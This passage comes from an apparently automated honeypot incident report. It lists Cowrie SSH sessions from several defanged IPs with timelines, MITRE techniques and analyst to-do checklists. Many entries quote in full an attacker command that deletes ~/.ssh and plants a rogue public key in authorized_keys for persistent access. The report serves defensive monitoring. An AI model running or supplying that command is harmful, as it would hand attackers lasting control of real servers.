- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85cd6e10e5e2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-04-16 19:44 |
| **Last Seen** | 2026-04-16 19:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:44:53` | `cowrie.session.connect` |
| `2026-04-16 19:44:53` | `cowrie.client.version` |
| `2026-04-16 19:44:53` | `cowrie.client.kex` |
| `2026-04-16 19:44:54` | `cowrie.login.success` |
| `2026-04-16 19:44:55` | `cowrie.session.params` |
| `2026-04-16 19:44:55` | `cowrie.command.input` |
| `2026-04-16 19:44:55` | `cowrie.command.failed` |
| `2026-04-16 19:44:55` | `cowrie.log.closed` |
| `2026-04-16 19:44:56` | `cowrie.session.params` |
| `2026-04-16 19:44:56` | `cowrie.command.input` |
| `2026-04-16 19:44:56` | `cowrie.session.file_download` |
| `2026-04-16 19:44:56` | `cowrie.log.closed` |
| `2026-04-16 19:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02421868c12

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-04-16 19:45 |
| **Last Seen** | 2026-04-16 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:45:03` | `cowrie.session.connect` |
| `2026-04-16 19:45:03` | `cowrie.client.version` |
| `2026-04-16 19:45:03` | `cowrie.client.kex` |
| `2026-04-16 19:45:04` | `cowrie.login.success` |
| `2026-04-16 19:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-166c444c02f9

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:45 |
| **Last Seen** | 2026-04-16 19:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:45:33` | `cowrie.session.connect` |
| `2026-04-16 19:45:33` | `cowrie.client.version` |
| `2026-04-16 19:45:33` | `cowrie.client.kex` |
| `2026-04-16 19:45:34` | `cowrie.login.success` |
| `2026-04-16 19:45:34` | `cowrie.session.params` |
| `2026-04-16 19:45:34` | `cowrie.command.input` |
| `2026-04-16 19:45:34` | `cowrie.command.failed` |
| `2026-04-16 19:45:34` | `cowrie.log.closed` |
| `2026-04-16 19:45:34` | `cowrie.session.params` |
| `2026-04-16 19:45:34` | `cowrie.command.input` |
| `2026-04-16 19:45:34` | `cowrie.session.file_download` |
| `2026-04-16 19:45:34` | `cowrie.log.closed` |
| `2026-04-16 19:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca5fe91b540

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:45 |
| **Last Seen** | 2026-04-16 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:45:36` | `cowrie.session.connect` |
| `2026-04-16 19:45:36` | `cowrie.client.version` |
| `2026-04-16 19:45:36` | `cowrie.client.kex` |
| `2026-04-16 19:45:37` | `cowrie.login.success` |
| `2026-04-16 19:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced1f6ede496

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:47 |
| **Last Seen** | 2026-04-16 19:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:47:03` | `cowrie.session.connect` |
| `2026-04-16 19:47:03` | `cowrie.client.version` |
| `2026-04-16 19:47:03` | `cowrie.client.kex` |
| `2026-04-16 19:47:04` | `cowrie.login.success` |
| `2026-04-16 19:47:04` | `cowrie.session.params` |
| `2026-04-16 19:47:04` | `cowrie.command.input` |
| `2026-04-16 19:47:04` | `cowrie.command.failed` |
| `2026-04-16 19:47:04` | `cowrie.log.closed` |
| `2026-04-16 19:47:04` | `cowrie.session.params` |
| `2026-04-16 19:47:04` | `cowrie.command.input` |
| `2026-04-16 19:47:04` | `cowrie.session.file_download` |
| `2026-04-16 19:47:04` | `cowrie.log.closed` |
| `2026-04-16 19:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fbd62f76e0

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:47 |
| **Last Seen** | 2026-04-16 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:47:06` | `cowrie.session.connect` |
| `2026-04-16 19:47:06` | `cowrie.client.version` |
| `2026-04-16 19:47:06` | `cowrie.client.kex` |
| `2026-04-16 19:47:07` | `cowrie.login.success` |
| `2026-04-16 19:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb39b49fc10

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:48 |
| **Last Seen** | 2026-04-16 19:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:48:34` | `cowrie.session.connect` |
| `2026-04-16 19:48:34` | `cowrie.client.version` |
| `2026-04-16 19:48:34` | `cowrie.client.kex` |
| `2026-04-16 19:48:34` | `cowrie.login.success` |
| `2026-04-16 19:48:35` | `cowrie.session.params` |
| `2026-04-16 19:48:35` | `cowrie.command.input` |
| `2026-04-16 19:48:35` | `cowrie.command.failed` |
| `2026-04-16 19:48:35` | `cowrie.log.closed` |
| `2026-04-16 19:48:35` | `cowrie.session.params` |
| `2026-04-16 19:48:35` | `cowrie.command.input` |
| `2026-04-16 19:48:35` | `cowrie.session.file_download` |
| `2026-04-16 19:48:35` | `cowrie.log.closed` |
| `2026-04-16 19:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05b31f6d8dc

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:48 |
| **Last Seen** | 2026-04-16 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:48:37` | `cowrie.session.connect` |
| `2026-04-16 19:48:37` | `cowrie.client.version` |
| `2026-04-16 19:48:37` | `cowrie.client.kex` |
| `2026-04-16 19:48:37` | `cowrie.login.success` |
| `2026-04-16 19:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dabc986ebac

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:49 |
| **Last Seen** | 2026-04-16 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:49:10` | `cowrie.session.connect` |
| `2026-04-16 19:49:10` | `cowrie.client.version` |
| `2026-04-16 19:49:10` | `cowrie.client.kex` |
| `2026-04-16 19:49:10` | `cowrie.login.success` |
| `2026-04-16 19:49:11` | `cowrie.session.params` |
| `2026-04-16 19:49:11` | `cowrie.command.input` |
| `2026-04-16 19:49:11` | `cowrie.command.failed` |
| `2026-04-16 19:49:11` | `cowrie.log.closed` |
| `2026-04-16 19:49:11` | `cowrie.session.params` |
| `2026-04-16 19:49:11` | `cowrie.command.input` |
| `2026-04-16 19:49:11` | `cowrie.session.file_download` |
| `2026-04-16 19:49:11` | `cowrie.log.closed` |
| `2026-04-16 19:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ef603f6c47

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:49 |
| **Last Seen** | 2026-04-16 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:49:13` | `cowrie.session.connect` |
| `2026-04-16 19:49:13` | `cowrie.client.version` |
| `2026-04-16 19:49:13` | `cowrie.client.kex` |
| `2026-04-16 19:49:13` | `cowrie.login.success` |
| `2026-04-16 19:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57acf7f1b268

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 19:49 |
| **Last Seen** | 2026-04-16 19:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:49:18` | `cowrie.session.connect` |
| `2026-04-16 19:49:18` | `cowrie.client.version` |
| `2026-04-16 19:49:18` | `cowrie.client.kex` |
| `2026-04-16 19:49:19` | `cowrie.login.success` |
| `2026-04-16 19:49:20` | `cowrie.session.params` |
| `2026-04-16 19:49:20` | `cowrie.command.input` |
| `2026-04-16 19:49:20` | `cowrie.command.failed` |
| `2026-04-16 19:49:20` | `cowrie.log.closed` |
| `2026-04-16 19:49:21` | `cowrie.session.params` |
| `2026-04-16 19:49:21` | `cowrie.command.input` |
| `2026-04-16 19:49:21` | `cowrie.session.file_download` |
| `2026-04-16 19:49:21` | `cowrie.log.closed` |
| `2026-04-16 19:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ad32b90be2

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 19:49 |
| **Last Seen** | 2026-04-16 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:49:27` | `cowrie.session.connect` |
| `2026-04-16 19:49:27` | `cowrie.client.version` |
| `2026-04-16 19:49:27` | `cowrie.client.kex` |
| `2026-04-16 19:49:29` | `cowrie.login.success` |
| `2026-04-16 19:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e0f44a8621

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:49 |
| **Last Seen** | 2026-04-16 19:50 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:49:51` | `cowrie.session.connect` |
| `2026-04-16 19:49:52` | `cowrie.client.version` |
| `2026-04-16 19:49:52` | `cowrie.client.kex` |
| `2026-04-16 19:49:55` | `cowrie.login.success` |
| `2026-04-16 19:49:58` | `cowrie.session.params` |
| `2026-04-16 19:49:58` | `cowrie.command.input` |
| `2026-04-16 19:49:58` | `cowrie.command.failed` |
| `2026-04-16 19:49:59` | `cowrie.log.closed` |
| `2026-04-16 19:50:00` | `cowrie.session.params` |
| `2026-04-16 19:50:00` | `cowrie.command.input` |
| `2026-04-16 19:50:02` | `cowrie.session.file_download` |
| `2026-04-16 19:50:02` | `cowrie.log.closed` |
| `2026-04-16 19:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d4700aee26

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:50 |
| **Last Seen** | 2026-04-16 19:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:50:10` | `cowrie.session.connect` |
| `2026-04-16 19:50:10` | `cowrie.client.version` |
| `2026-04-16 19:50:12` | `cowrie.client.kex` |
| `2026-04-16 19:50:15` | `cowrie.login.success` |
| `2026-04-16 19:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48c90402462

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:50 |
| **Last Seen** | 2026-04-16 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:50:53` | `cowrie.session.connect` |
| `2026-04-16 19:50:53` | `cowrie.client.version` |
| `2026-04-16 19:50:53` | `cowrie.client.kex` |
| `2026-04-16 19:50:53` | `cowrie.login.success` |
| `2026-04-16 19:50:54` | `cowrie.session.params` |
| `2026-04-16 19:50:54` | `cowrie.command.input` |
| `2026-04-16 19:50:54` | `cowrie.command.failed` |
| `2026-04-16 19:50:54` | `cowrie.log.closed` |
| `2026-04-16 19:50:54` | `cowrie.session.params` |
| `2026-04-16 19:50:54` | `cowrie.command.input` |
| `2026-04-16 19:50:54` | `cowrie.session.file_download` |
| `2026-04-16 19:50:54` | `cowrie.log.closed` |
| `2026-04-16 19:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdbfa7cfd092

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:50 |
| **Last Seen** | 2026-04-16 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:50:56` | `cowrie.session.connect` |
| `2026-04-16 19:50:56` | `cowrie.client.version` |
| `2026-04-16 19:50:56` | `cowrie.client.kex` |
| `2026-04-16 19:50:56` | `cowrie.login.success` |
| `2026-04-16 19:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65428d40184

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:51 |
| **Last Seen** | 2026-04-16 19:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
